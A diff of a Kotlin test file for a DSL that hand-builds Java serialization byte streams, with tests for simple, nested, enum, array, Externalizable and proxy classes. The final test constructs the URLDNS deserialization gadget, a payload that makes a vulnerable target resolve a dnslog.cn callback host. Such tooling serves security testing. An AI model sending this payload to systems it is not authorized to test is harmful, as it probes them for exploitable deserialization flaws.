@@ -2,7 +2,6 @@ import io.kotest.core.spec.style.StringSpec
 import io.kotest.matchers.shouldBe
 import java.io.*
 import java.io.ObjectStreamConstants.*
-import java.lang.reflect.InvocationHandler
 import java.lang.reflect.Proxy
 import kotlin.experimental.or
 
@@ -21,8 +20,8 @@ fun ByteArray.toHex(): String = joinToString(separator = "") { eachByte -> "%02x
 class AllTests : StringSpec({
     "处理简单的可序列化类" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = SimpleSerializableClass::class.java
                     uid = SimpleSerializableClass.serialVersionUID
                     flags = SC_SERIALIZABLE
@@ -30,10 +29,8 @@ class AllTests : StringSpec({
                     "i" type Int::class.java
                 }
             }
-            slot {
-                prims {
-                    intVal(1)
-                }
+            values {
+                int(1)
             }
         }
 
@@ -44,8 +41,8 @@ class AllTests : StringSpec({
 
     "处理嵌套关系" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = NestedSerializableClass::class.java
                     uid = NestedSerializableClass.serialVersionUID
                     flags = SC_SERIALIZABLE
@@ -58,19 +55,17 @@ class AllTests : StringSpec({
                     "s" type String::class.java
                 }
             }
-            slot {
-                prims {
-                    floatVal(10f)
-                    intVal(1)
-                }
-                objs {
-                    jclass {
+            values {
+                float(10f)
+                int(1)
+                obj {
+                    clazz {
                         type = Serializable::class.java
                         flags = SC_SERIALIZABLE
                     }
-                    serialObj {
-                        descriptors {
-                            desc {
+                    new {
+                        desc {
+                            new {
                                 type = NestedSerializableClass.NestedClass::class.java
                                 uid = NestedSerializableClass.NestedClass.serialVersionUID
                                 flags = SC_SERIALIZABLE
@@ -78,9 +73,7 @@ class AllTests : StringSpec({
                                 "l" type Long::class.java
                             }
                         }
-                        slot {
-                            prims { longVal(5L) }
-                        }
+                        values { long(5L) }
                     }
                     nil()
                     string("test")
@@ -97,22 +90,22 @@ class AllTests : StringSpec({
 
     "处理继承关系" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = HierarchySub::class.java
                     uid = HierarchySub.serialVersionUID
 
                     "c" type Char::class.java
                 }
-                desc {
+                new {
                     type = HierarchyBase::class.java
                     uid = HierarchyBase.serialVersionUID
 
                     "i" type Int::class.java
                 }
             }
-            slot { prims { intVal(5) } }
-            slot { prims { charVal('a') } }
+            values { int(5) }
+            values { char('a') }
         }
 
         val expectedData: ByteArray = serialize(HierarchySub(5, 'a'))
@@ -122,22 +115,22 @@ class AllTests : StringSpec({
 
     "处理枚举类型" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = ClassWithEnum::class.java
                     uid = ClassWithEnum.serialVersionUID
 
                     "e" type TestEnum::class.java
                 }
             }
-            slot {
-                objs {
+            values {
+                obj {
                     enum("TEST") {
-                        desc {
+                        new {
                             type = TestEnum::class.java
                             flags = SC_SERIALIZABLE or SC_ENUM
                         }
-                        desc {
+                        new {
                             type = Enum::class.java
                             flags = SC_SERIALIZABLE or SC_ENUM
                         }
@@ -153,8 +146,8 @@ class AllTests : StringSpec({
 
     "处理数组类型" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = ClassWithArray::class.java
                     uid = ClassWithArray.serialVersionUID
 
@@ -162,26 +155,24 @@ class AllTests : StringSpec({
                     "objects" type Array<Any>::class.java
                 }
             }
-            slot {
-                objs {
+            values {
+                obj {
                     array(type = IntArray::class.java) { +intArrayOf(1, 2, 3) }
                     array(type = Array<Serializable>::class.java) {
                         elements {
                             // bug: string("test \u0000 \u0100 \uD800\uDC00 \uDC00")
                             string("test")
-                            serialObj {
-                                descriptors {
-                                    desc {
+                            new {
+                                desc {
+                                    new {
                                         type = SimpleSerializableClass::class.java
                                         uid = SimpleSerializableClass.serialVersionUID
 
                                         "i" type Int::class.java
                                     }
                                 }
-                                slot {
-                                    prims {
-                                        intVal(1)
-                                    }
+                                values {
+                                    int(1)
                                 }
                             }
                         }
@@ -204,24 +195,24 @@ class AllTests : StringSpec({
     fun StreamBuilder.writeArray() =
         array(type = Array<Serializable>::class.java) {
             elements {
-                serialObj {
-                    descriptors {
-                        desc {
+                new {
+                    desc {
+                        new {
                             type = SimpleSerializableClass::class.java
                             uid = SimpleSerializableClass.serialVersionUID
 
                             "i" type Int::class.java
                         }
                     }
-                    slot { prims { intVal(1) } }
+                    values { int(1) }
                 }
             }
         }
 
     "处理 Externalizable 接口的实现类" {
         val actualData = External {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = SimpleExternalizableClass::class.java
                     uid = SimpleExternalizableClass.serialVersionUID
                     flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
@@ -243,19 +234,19 @@ class AllTests : StringSpec({
 
     "处理 Externalizable 实现类的嵌套关系" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = ClassWithExternalizable::class.java
                     uid = ClassWithExternalizable.serialVersionUID
 
                     "e" type SimpleExternalizableClass::class.java
                 }
             }
-            slot {
-                objs {
-                    serialObj {
-                        descriptors {
-                            desc {
+            values {
+                obj {
+                    new {
+                        desc {
+                            new {
                                 type = SimpleExternalizableClass::class.java
                                 uid = SimpleExternalizableClass.serialVersionUID
                                 flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
@@ -280,13 +271,13 @@ class AllTests : StringSpec({
 
     "处理 Externalizable 实现类的继承关系" {
         val actualData = External {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = ExternalExtendsSerial::class.java
                     uid = ExternalExtendsSerial.serialVersionUID
                     flags = SC_EXTERNALIZABLE or SC_BLOCK_DATA
                 }
-                desc {
+                new {
                     type = SimpleSerializableClass::class.java
                     uid = SimpleSerializableClass.serialVersionUID
 
@@ -314,12 +305,12 @@ class AllTests : StringSpec({
         )
 
         val actualData = Serial {
-            descriptors { proxy(InterfaceA::class.java, InterfaceB::class.java) }
-            slot {
-                objs {
-                    serialObj {
-                        descriptors {
-                            desc {
+            desc { proxy(InterfaceA::class.java, InterfaceB::class.java) }
+            values {
+                obj {
+                    new {
+                        desc {
+                            new {
                                 type = SerializableInvocationHandler::class.java
                                 uid = SerializableInvocationHandler.serialVersionUID
                             }
@@ -336,21 +327,19 @@ class AllTests : StringSpec({
 
     "自定义 writeObject 方法" {
         val actualData = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     type = ClassWithWriteObject::class.java
                     uid = ClassWithWriteObject.serialVersionUID
                     flags = SC_SERIALIZABLE or SC_WRITE_METHOD
                 }
             }
-            slot {
-                writeObject {
-                    it.writeInt(5)
-                    it.writeBoolean(true)
+            writeObject {
+                it.writeInt(5)
+                it.writeBoolean(true)
 
-                    string("test")
-                    writeArray()
-                }
+                string("test")
+                writeArray()
             }
         }
 
@@ -361,8 +350,8 @@ class AllTests : StringSpec({
 
     "Sample gadget: URLDNS" {
         val payload = Serial {
-            descriptors {
-                desc {
+            desc {
+                new {
                     typeName = "java.util.HashMap"
                     uid = 362498820763181265L
                     flags = SC_SERIALIZABLE or SC_WRITE_METHOD
@@ -371,46 +360,42 @@ class AllTests : StringSpec({
                     "threshold" type Int::class.java
                 }
             }
-            slot {
-                prims {
-                    floatVal(0.75f)
-                    intVal(12)
-                }
-                writeObject {
-                    it.write(byteArrayOf(0, 0, 0, 16, 0, 0, 0, 1))
-                    serialObj {
-                        descriptors {
-                            desc {
-                                typeName = "java.net.URL"
-                                uid = -7627629688361524110L
-                                flags = SC_SERIALIZABLE or SC_WRITE_METHOD
+            values {
+                float(0.75f)
+                int(12)
+            }
+            writeObject {
+                it.write(byteArrayOf(0, 0, 0, 16, 0, 0, 0, 1))
+                new {
+                    desc {
+                        new {
+                            typeName = "java.net.URL"
+                            uid = -7627629688361524110L
+                            flags = SC_SERIALIZABLE or SC_WRITE_METHOD
 
-                                "hashCode" type Int::class.java
-                                "port" type Int::class.java
-                                "authority" type String::class.java
-                                "file" type String::class.java
-                                "host" type String::class.java
-                                "protocol" type String::class.java
-                                "ref" typeName "java.lang.String"
-                            }
-                        }
-                        slot {
-                            prims {
-                                intVal(-1)
-                                intVal(-1)
-                            }
-                            objs {
-                                string("dserial.kyrvep.dnslog.cn")
-                                string("")
-                                string("dserial.kyrvep.dnslog.cn")
-                                string("http")
-                                nil()
-                            }
-                            writeObject {}
+                            "hashCode" type Int::class.java
+                            "port" type Int::class.java
+                            "authority" type String::class.java
+                            "file" type String::class.java
+                            "host" type String::class.java
+                            "protocol" type String::class.java
+                            "ref" typeName "java.lang.String"
                         }
                     }
-                    string("http://dserial.kyrvep.dnslog.cn")
+                    values {
+                        int(-1)
+                        int(-1)
+                        obj {
+                            string("dserial.kyrvep.dnslog.cn")
+                            string("")
+                            string("dserial.kyrvep.dnslog.cn")
+                            string("http")
+                            nil()
+                        }
+                    }
+                    writeObject {}
                 }
+                string("http://dserial.kyrvep.dnslog.cn")
             }
         }
 
